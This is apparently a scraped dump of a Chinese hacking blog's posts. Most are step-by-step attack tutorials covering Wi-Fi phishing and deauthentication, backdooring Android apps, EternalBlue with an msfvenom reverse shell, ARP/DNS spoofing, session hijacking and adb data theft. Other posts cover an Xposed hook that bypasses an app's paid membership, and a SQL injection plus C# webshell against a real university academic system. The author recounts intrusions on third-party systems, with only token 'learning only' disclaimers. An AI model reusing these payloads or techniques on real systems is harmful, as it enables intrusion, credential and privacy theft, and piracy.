开启一个web服务，创建一个钓鱼的web页面，要求用户输入wifi密码 模拟dns服务，把所有的请求都解析到自己的ip中 ddos目标ap，使用户连不上路由器 用户连接不上wifi后就会自动连上我们的钓鱼wifi 连上后就所有请求页面都会转到我们的钓鱼页面。 用户输入wifi密码后通过抓取的握手包来匹配正确密码。 这里我们使用Fluxion（当然也有相同的WiFiPhisher）来完成上述的过程 安装首先把程序下载到本地 git clone https://github.com/FluxionNetwork/fluxion.git 首先进入install目录中运行install，会自动把依赖的软件包自动安装好。 ↓ 攻击安装完毕之后就可以直接开启fluxion了。 ↓ 一开始选择语言，其中有中文，但是我还是建议使用英文的。 选择语言后来扫描指定ap的信道。 ↓ 第一个是扫描全部信道，第二个是扫描指定信道，我们选择扫描全部信道。 选择之后会自动开启一个小窗口来扫描ap，如果扫描到了我们要的ap就ctrl+c强制停止掉。 ↓ 停止扫描后会把刚刚我们扫描到的ap都显示出来，选择我们需要攻击的ap。 ↓ 然后选择攻击方式。 ↓ 第一个就是我上面说的伪装ap攻击。我们选第一个。 选择后我们需要设置保存握手包保存路径。 ↓ 我们可以选择默认路径，直接回车。 然后选择抓取握手包的方式。 ↓ 选择我们攻击ap的方式，第一个是使用默认aireplay来攻所有的客户端，第二个则是使用mdk3来攻击所有的客户端。 选择之后会同时开启2个小窗口，一个来ddos攻击ap，第二个来抓取握手包。 ↓ 如果抓取到握手包了右上角会有显示。 ↓ 这个时候可以直接关掉小窗口了，然后查看握手包。 ↓ 来创建一个ssl证书。↓ 开启web服务。↓ 选择路由器的登录界面，在我们国内使用的tp-link比较多，我们可以选择tp-link。 ↓ 完毕之后会同时开启4个窗口，一个dhcp来分配ip，一个用来监听连接进钓鱼ap的客户端，一个来把所有请求解析到本地，最后一个来ddos目标的wifi。 ↓ 这个时候的客户端呢，用户会连接不上原wifi，而会自动连上我们的钓鱼wifi，而且一连上wifi就会自动打开网页，进入我们的钓鱼页面。 ↓ 同时浏览器也会提示用户登录wifi。 ↓ 用户输入密码后，会根据抓到的握手包来匹配正确密码。 ↓ 直到用户输入正确密码后，程序停止。 末尾&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;另外破解wifi还有使用reaver来穷举pin码，只有ap开着wps，并且没有做防pin的处理，那么可以百分百破解得到密码。但是不知道是不是我这个网卡原因，一直pin失败，所有ap都是一样的。等我解决这个问题后再来发布关于pin码的文章好了。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"wifi破解","slug":"wifi破解","permalink":"http://y00z.github.io/tags/wifi破解/"}]},{"title":"向安卓app中注入payload后门","date":"2017-04-25T09:08:41.000Z","path":"2017/04/25/diary-2017-0425-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文在前面的文章中我有说到过如何向android植入后门app，我们用的方法是使用msf生成一个payload，需要用户单独安装后才行。(点我)那么可不可以向一个正常的app注入payload呢，当然是可以的。原理就是反编译app,然后在app中注入payload代码，然后再重新编译打包。前提是app没有做过一些加固等操作. 在msf中就提供了这样注入方式。 会对该app进行反编译，然后会找到可以注入载荷的钩子点。进一步，它会利用可用于后渗透活动的附加权限使该app的Android清单文件染毒。 这里呢，我使用backdoor-apk来向app注入payload 其中有3个选项， 选择反弹的payload 监听的ip 监听的端口 完毕之后染毒的apk在original/dist目录中，并且会在本地生成一个backdoor-apk.rc文件。 backdoor-apk.rc里面包含着msf的所有配置，所以我们可以直接启动msf并且指定backdoor-apk.rc文件即可。会自动帮我们把msf配置好 手机安装上染毒的apk，msf成功收到反弹到一个会话","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"路由器刷入breed","date":"2017-04-22T06:03:18.000Z","path":"2017/04/22/diary-2017-0422-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;什么是breed呢，breed又称不死breed，就相当于安卓的rec。和固件是分开的，刷其他固件并不会影响到breed。如果刷的固件不兼容,路由器刷成砖了，就可以通过web进入breed，再刷其他的固件,来恢复路由器。 正文&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;前几天看到某东做活动，买了一台k2，正式开启了刷路由器之旅，以前也看过很多关于路由器的技术文章，由于一直没有多余的路由器，一直无法实际操作。 k2中有可以官方直刷的breed，所以刷入breed很容易，在路由器后台选择手动升级，然后载入相应的breed的bin文件就ok了 完毕后怎么进入breed呢，拔掉路由器电源，然后电脑网线连接路由器的LAN口，自动获取IP。 按住路由器RESET键，按住不动，然后路由器再插上电源，RESET键持续按住几秒，然后电脑访问192.168.1.1就可以进入breed控制台了。 breed下载地址 https://breed.hackpascal.net/","tags":[{"name":"路由器","slug":"路由器","permalink":"http://y00z.github.io/tags/路由器/"}]},{"title":"React-Native狗狗说项目+NodeJs服务器","date":"2017-04-21T14:26:15.000Z","path":"2017/04/21/diary-2017-0421-01/","text":"前言&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;学习React-Native中的一个小项目，录制视频和音频，然后去掉视频中的声音，再把无声音的视频和录的音频合并，项目用的ES6语法。同时主页使用了rap和mock数据测试框架。 用到了第三方组件有 react-native-video react-native-sound react-native-image-picker react-native-audio react-native-vector-icons等等一些其他第三方组件。支持同步上传到七牛和cloudinary网盘中。 服务器端使用的是NodeJs，express4框架。同时使用了luosimao短信验证码平台。 encoding…… 客户端 https://github.com/Y00z/react-navie_dogSpeak 服务端 https://github.com/Y00z/react-navie_dogSpeak_service","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://y00z.github.io/tags/NodeJs/"},{"name":"React-Native","slug":"React-Native","permalink":"http://y00z.github.io/tags/React-Native/"}]},{"title":"微软末日:黑掉全球70%电脑的0day","date":"2017-04-15T12:41:27.000Z","path":"2017/04/15/diary-2017-0415-03/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，造成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的exp，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。 ps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。 环境 python2.6.6/32位 pywin32-221.win32-py2.6 靶机 win7 攻击者1 攻击者2 配置下载解压后切换到windows目录执行python fb.py默认选项参数特别多，我这里只说重要需要填写的参数 输入靶机ip和攻击者ip以及选择是否开启本地监听。 创建一个工程项目，名字随意 选择模块，选择Eternalblue模块，输入use Eternalblue 一路回车选择默认的配置，然后到了这一步我们选择目标的系统，以及攻击方式 然后继续一路回车选择默认的配置，直到我们看到了这个 success 就说明成功了。 接下来继续选择攻击方式模块，选择Doublepulsar模块， 输入use Doublepulsar，继续一路回车，然后到这一步选择攻击的服务和目标系统的位数以及攻击方式 然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll &gt; s.dll 如果电脑是32位的就去掉x64/，默认生成的就是32位的 然后再启动配置msf，并监听反弹的shell。1234msf &gt; use exploit/multi/handlemsf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_Tcpmsf exploit(handler) &gt; set LHOST 192.168.1.102msf exploit(handler) &gt; set LPORT 5554 选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。 再来看看我们监听的反弹shell 成功反弹，喜大普奔。 结尾 可惜我没有服务器，只能做做内网测试。与此同时公布漏洞的十多个小时中，微软终于出了补丁(点我)并且把此漏洞定为编号MS17-010，win10以下系统更新补丁后的windows将不受影响。 总结 这个NSA的武器库，不需要做任何操作，只要是联网的，就可以做到指哪儿打哪儿，把远程溢出攻击简化成如此简单。这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，然而每年各种黑客国际大会比赛几乎都是中国拿的冠军，原来是美国黑客压根就没参加。ps：这个武器库和msf很像，但是感觉没有msf好用，默认选项太多，也许是msf用习惯了吧。 下载地址： https://github.com/x0rz/EQGRP_Lost_in_Translation","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"内网王者之会话劫持","date":"2017-04-14T17:02:14.000Z","path":"2017/04/15/diary-2017-0415-02/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。 受害者 攻击者 环境用到的工具 ferret tcpdump Hamster 其中ferret没有64位的，如果用的64位系统，需要安卓32位的ferret，而32位自带ferret。 添加对32位应用程序的支持 dpkg –add-architecture i386 安装32位ferret sudo aptitude install ferret-sidejack:i386 攻击首先arp走一波，前面的文章我有介绍到ettercap，今天这里介绍一个小巧的arp工具。arpspoof arpspoof -i eth0 -t 192.168.1.1 192.168.1.101 -i 网卡名 -t 网关和受害者ip 然后使用tcpdump来捕获数据包。 tcpdump -i eth0 -w data.cap -i 网卡名 -w 保存的数据包 这个时候受害者登录微博。 这个时候数据包中的数据都是受害者的网络请求数据，其中包含着cookies. 然后使用ferret来处理数据包。 ferret -r data.cap 处理完成后会在本地生成一个hamster.txt文件。 然后运行hamster。 我们需要打开设置代理。 设置完成后，打开浏进入127.0.0.1:1234，这时候里面的数据都是受害者的所有网络请求数据，包含着登录信息。找到登录后的信息。 劫持成功。 同时也可以发微博","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"内网王者之dns劫持","date":"2017-04-14T16:26:45.000Z","path":"2017/04/15/diary-2017-0415-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。 受害者 攻击者 配置 首先我们需要更改ettercap的dns配置文件，位置在于/etc/ettercap/etter.dns, 我们直接shift+g来到配置文件的最后，配置劫持的域名，和域名所解析的ip，可用*通配符 我把所有.com和.cn的域名全部解析到了本地，也就是说访问.com和.cn的域名，会自动解析我的ip地址。 然后我们开启web服务器并且来到/var/www/html/路径，这里是默认weib服务器的网站目录，我们新建index.html内容随意。 攻击 配置完成之后我们就可以开始攻击了 ettercap -i eth0 -Tq -P dns_spoof /ip// /网关// -i 选择网卡 -T 文本模式 -P 选择模块 后面的两组/，如果我选择内网里所有目标，可以不填ip， 可以看到检测到了3个目标， 我们来ping一下百度 可以看到百度的解析ip变成了我们的ip，说明我们已经劫持成功了，我们来访问一下百度 劫持成功，网页显示的是我们刚刚搭建web服务器中的内容，同时还会检测到访问的所有请求，全部都劫持解析到我们的ip中来。 也就是我们在配置文件上写的.com和.cn的域名全部会解析到我们的ip中来。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"内网王者之arp攻击","date":"2017-04-14T14:48:19.000Z","path":"2017/04/14/diary-2017-0414-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;中间人攻击是好久之前的攻击手段了，早在高三的时候就已经玩透了。应该还有很多人不了解内网安全，我这里还是写出来一下。对于zANTI和DSploit这种就不多说了，我们这里使用老牌套件ettercap 配置更改ettercap配置文件 vi /etc/ettercap/etter.conf esc键 然后 冒号(:) 然后 / 输入Linux。在配置文件中找到Linux字符串。 然后开启暂时路由转发 echo 1 &gt; /proc/sys/net/ipv4/ip_forward * ettercap -i eth0 -Tq -M arp:remote /ip// /网关// -i 选择网卡 -T 文本模式 -M Mitm 后面的两组/，如果我选择内网里所有目标，可以不填ip。 上面说的是命令行中攻击，当然ettercap也有图形化，下面我们使用图形化来简化攻击流程。 ettercap -G 运行图形化，选择Sniff =&gt; Unified sniffing , 来选择网卡 然后Hosts =&gt; Scan for host 来扫描内网中的设备 扫描完毕后Host List显示内网中所有的设备 设备全部选择后，在把网关添加到target 1 其他设备添加到target 2中， 然后选择Mitm =&gt; ARP poisoning 选择攻击模式 勾上 Sniff remote connections，确定 最后start =&gt; Start sniffing 开始攻击 如果网站用了ssl加密呢，那么可以使用sslstrip来针对ssl的攻击。 10000为sslstrip的监听端口 iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-ports 10000 开启sslstrip，并且监听； sslstrip -l 10000 sslstrip会把https网址强制转换成http，然后再通过arp攻击就可以抓取明文信息了。 总结攻击后受害者的所有流量都会经过攻击者，ettercap会自动抓取 TELNET、FTP、SSH、SMB、MySQL等等一些协议信息，同时也可以开wireshark来抓取更多的信息。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"wifi破解之WPA/WPA2抓包跑包","date":"2017-04-12T13:13:22.000Z","path":"2017/04/12/diary-2017-0412-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;wifi有很多种方法，这里就说一下Aircrack-ng套件，Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶，cdlinux等这些就更不多说了，都是基于Aircrack-ng的 扫描ap 准备一个无限网卡，然后ifconfig可以看到网卡信息,如果看不到是因为无线网卡没启用就ifconfig -a查看全部无线网卡，可以ifconfig wlan0 up来启用。 然后扫描一下附近的ap。 airodump-ng wlan0wlan0是ifconfig的网卡名称，注意：我用的是kali2.0，其他版本的可能需要airmon-ng start wlan0把网卡置于监听模式 下面的STATION为连接AP的客户端，看BSSID来区分客户端属于哪个AP的注意：抓包必须要有客户端连接才可以抓包。 抓握手包 扫描到AP信息后来抓包 airodump-ng –bssid EC:88:8F:8A:9C:A0 -w mywifi -c 6 wlan0-bssid 要抓的ap的mac-w 保存的包名-c 信道(就是扫描中的CH)注意：抓包中需要攻击ap，让客户端断线，客户端重新连接ap后才可以抓到包。可以用aireplay-ng组件来攻击ap aireplay-ng -0 0 -a EC:88:8F:8A:9C:A0 wlan0-0 冲突攻击模式-a ap的mac 抓到握手包后右上角会显示抓到包的客户端mac 跑包 aircrack-ng -w [字典] [抓到的cap包]","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"wifi破解","slug":"wifi破解","permalink":"http://y00z.github.io/tags/wifi破解/"}]},{"title":"burp爆破http Basic认证","date":"2017-04-04T11:38:29.000Z","path":"2017/04/04/diary-2017-0404-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;闲来没事想来看看房东的路由器，来试试使用burp爆破一波,对于如何配置burp就不多说了。不用验证码，很好。 然后我们来登录看看发的哪些请求 看样子密码经过base64加密了 可以看到帐号默认admin，然后后面就是我们输入的密码 于是我输入另一个密码，来看一下编码中密码是从哪儿开始的知道了编码中那些是密码，然后我们回到burp中，把请求发送到intruder,来配置字典playload 首先load进字典文件然后到下面的playload Processing,选择add 我们需要的处理是把字典中的密码来编码成base64的，于是选择encode选择什么样的编码呢？我们选择base64, 当然这里也有其他的编码，urlencode等。然后start attack，走你可以看到密码已经全部经过base64加密了。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"开发xposed破解模块","date":"2017-03-28T09:13:30.000Z","path":"2017/03/28/diary-2017-0328-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个挺好玩的app，百变语音，就是在qq上可以把自定义的mp3以语音形式发送给好友。app上有很多男女说话的语音供用户下载使用，同时也可以把qq里面别人发的语音下载过来自己用。(当你听到一个甜美的美女声音的时候，背后可能是一个基佬。)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中还有会员功能，会员功能有更多的语音，并且同时可以在微信中使用。ok让我们来分析一下吧。 反编译 首先来反编译走一波。前面的文章有说道如何反编译，这里就不多说了。 一个小小的app还有这么多包。翻AndroidManifest找入口的Activity 可以看到，指定了一个路径然后给了a.b，然后获取了包名给了a.g，然后有创建了一个HashMap给q.c，然后然后。。。。(我实在编不下去了。)这特么是些啥玩意儿，然后我不看这些杂乱无章的代码，找一下关于会员的关键代码，依然找不到任何线索。这时候突然看到了一个很奇怪的包名 进去看依然是被混淆得不成样子的代码。不过为什么要叫iapp呢，于是我百度了一番。 （这是一款神奇的软件，iApp是一款让你的手机展现放光彩的应用。轻松的操作就可以设计出，你想要的应用界面，你可以分享给你的朋友，传递你的快乐！iApp采用了可视化设计界面，让你设计界面的时候一目了然，不用繁琐的看着代码伤脑筋了！iApp不是一款简单的应用程序，它是创造应用的应用程序。 如果你没有iApp 你就真的没有iApp！ )嗯，非常好，前者有e4a，现在又出来个iapp。全都是直接拖组件的，怪不得这么多包名。 于是不看代码了，看看app的网络请求。 全都是一些注释信息和语音名单。同时把手机的IMEI码上传到了服务器。 其中的vip.php引起了我的注意。返回 0 于是我把这个请求使用burp重定向到了本地，返回 1，这个时候奇迹出现了，Duang 直接就成会员了。 末尾 这个app原理其实很简单，利用了qq的校验不严的漏洞。在录语音的时候会在本地生成已一个语音文件，然后发送给好友就是把这个语音文件发送了出去。然而发送的时候这个语音文件和录语音时生成的语音文件并没有做校验，导致了可以任意发送语音文件。 编写Hook模块。 结论，当访问指定地址的时候如果返回1就是会员。两种方法。1,把请求重定向自己的页面，返回12,把请求的响应体强制改成1 我们直接来hook网络请求模块，1234567891011121314findAndHookMethod(\"org.apache.http.impl.client.AbstractHttpClient\", lpparam.classLoader, \"execute\", HttpHost.class, HttpRequest.class, HttpContext.class, new XC_MethodHook() &#123; @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable &#123; HttpRequest request = (HttpRequest) param.args[1]; if (request instanceof org.apache.http.client.methods.HttpGet) &#123; org.apache.http.client.methods.HttpGet httpGet = (org.apache.http.client.methods.HttpGet) request; if (httpGet.getURI().toString().contains(\"dess.ml/vip/vip.php?imei=\")) &#123; BasicHttpResponse basicHttpResponse = (BasicHttpResponse) param.getResult(); basicHttpResponse.setEntity(new StringEntity(\"1\", \"utf-8\")); toast(\"-----破解成功-----\"); &#125; &#125; &#125;&#125;); app用的是apache的网络包，当然还有一个java的网络包 app和模块下载地址 http://pan.baidu.com/s/1skFxIuL 密码: 8zyj","tags":[{"name":"xposed","slug":"xposed","permalink":"http://y00z.github.io/tags/xposed/"},{"name":"破解","slug":"破解","permalink":"http://y00z.github.io/tags/破解/"}]},{"title":"xposed环境搭建","date":"2017-03-25T10:55:37.000Z","path":"2017/03/25/diary-2017-0325-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xposed是GitHUB上rovo89大神设计开发的一个针对Android平台的动态劫持项目，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。 正文 安卓环境就不多说了。 1 创建一个安卓工程项目初识状态 2 导入xposed的jar包下载地址： https://bintray.com/rovo89/de.robv.android.xposed/api下载里面的api-82-sources.jar和api-82.jar导入到项目的lib目录下 3 修改AndroidManifest.xml在application节点中加入代码 123456789&lt;meta-data android:name=\"xposedmodule\" android:value=\"true\" /&gt; &lt;meta-data android:name=\"xposeddescription\" android:value=\"Hook log test\" /&gt; &lt;meta-data android:name=\"xposedminversion\" android:value=\"53\" /&gt; 4 修改build.gradleprovided 方式导入jar包123456dependencies &#123; compile 'com.android.support:appcompat-v7:25.2.0' testCompile 'junit:junit:4.12' provided 'de.robv.android.xposed:api:82' provided 'de.robv.android.xposed:api:82:sources'&#125; 注意,注意,注意,注意,注意,注意这里默认有个 compile fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;]) 一定要删掉。 5 创建一个类创建一个Tutorial类，继承IXposedHookLoadPackage 12345public class Tutorial implements IXposedHookLoadPackage &#123; public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable &#123; XposedBridge.log(\"正在加载中.....\" + lpparam.packageName); &#125;&#125; 6 创建入口文件。创建一个assets文件，并且在里面创建一个xposed_init文件。xposed_init里面内容为Tutorial的完全路径hk.myapplication03.Tutorial //完整类名:包名+类名 Ok，全部已经搭建好了，来运行一下，需要进到框架中激活并且重启才能生效。查看一下log日志。 OK了， 环境搭建完成并且成功的实现了一个简单的HOOK","tags":[{"name":"xposed","slug":"xposed","permalink":"http://y00z.github.io/tags/xposed/"}]},{"title":"adb指令渗透手机获取隐私信息","date":"2017-03-17T03:00:20.000Z","path":"2017/03/17/diary-2017-0317-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。 发送短信 控制受害者手机发送短信，这个只需要三条命令就可以达到。 打开了短信应用程序，当前焦点在文本框 adb shell am start -a android.intent.action.SENDTO -d sms:10086 –es sms_body “hello” –ez exit_on_sent true焦点去到发送按键 adb shell input keyevent 22回车，就是按下发送键 adb shell input keyevent 66 监视受害者手机 对受害者手机屏幕录屏，然后从手机传输到电脑。 adb shell screenrecord /sdcard/test.mp4录制完毕后再从手机传输到电脑中 adb pull /sdcard/test.mp4 d:\\test.mp4其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。 adb shell screenrecord –size 848x480 /sdcard/test.mp4 静默安装程序 将恶意程序静默安装在受害者手机内。 adb install d:/test.apk打开启动程序 adb shell am start -n hk.myapplication/hk.myapplication.MainActivityhk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径. 窃取通讯录短信等隐私。 作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。通讯录和通话记录的数据库存放在/data/data/com.android.providers.contacts/databases/contacts2.db短信的数据库存放在/data/data/com.android.providers.telephony/databases/mmssms.dbps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。另外所有安卓手机中，我们手机拍摄的照片都会保存在/sdcard/DCIM这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。 末尾 这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施 不要使用安全性未知的数据线连接自己的手机。 在非需要调试的情况下，不要开启adb调试。 安装可靠的手机杀毒软件。","tags":[{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"},{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"某教务系统注入getshell提权一条龙(下)","date":"2017-03-14T03:14:42.000Z","path":"2017/03/14/diary-2017-0314-02/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。 漏洞详情 登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传 这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话 poc:12345678910111213141516171819&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; using System; using System.Web; using System.IO; public class Handler : IHttpHandler &#123; public void ProcessRequest (HttpContext context) &#123; context.Response.ContentType = &quot;text/plain&quot;; string show=&quot;&lt;%@ Page Language=\\&quot;Jscript\\&quot;%&gt;&lt;%eval(Request.Item[\\&quot;chopper\\&quot;],\\&quot;unsafe\\&quot;);%&gt;&quot;; StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); file1.Write(show); file1.Flush(); file1.Close(); &#125; public bool IsReusable &#123; get &#123; return false; &#125; &#125; &#125; 会上传在wbwj目录下 访问http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码 chopper 一句话地址，http://***.***.com/wbwj/root.aspx 连接之 看下权限,还是挺大的， 直接上传神器提权之。 3389端口没有改，直接连接。 在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。 在站的根目录，web.config文件中，可以看到数据库地址，以及连接数据库的用户名和加密密码 总结 这个是什么教务系统就不多说，用过的一看就知道。有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。再次提醒：文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"某教务系统注入getshell提权一条龙(上)","date":"2017-03-14T03:14:26.000Z","path":"2017/03/14/diary-2017-0314-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。 漏洞详情 今天的目标 找到webservice接口，路径在service.asmx 漏洞在于 GetStuCheckinInfo这个接口 我们只需要关注xh和 strKey 这两个节点就可以了。 其中的strKey都是默认的KKKGZ2312 Xh这个节点就是我们的注入语句了。 poc:123222222' union select Null,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01 yhb 用户表yhm 用户名kl 口令 表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01) 构造好语句开始注入 可以看到jwc01用户的密码密文出来了。 我们拿去解密 Ok可以登录了 Bingo 靓女多多， 总结 不想让文章太长，getshell提权部分就放在下篇。后期还会写更多的渗透文章，漫游内网，更改led大屏幕，免费上网，好(gai)好(cheng)学(ji)习，社工辅导员qq微博等等。再次提醒：文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"s2-045任意命令执行exp","date":"2017-03-07T08:19:32.000Z","path":"2017/03/07/diary-2017-0307-01/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 今天早上一醒就被s2漏洞给刷屏了,心想一下这不是几年前的漏洞吗，怎么又火起来了 详细了解之后才知道今天凌晨的时候又爆了一个任意命令执行漏洞，由安恒WEBIN实验室发现. 涉及Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10多个版本。 可将版本更新至Struts 2.3.32 或者 Struts 2.5.10.1 或 使用第三方的防护设备进行防护。 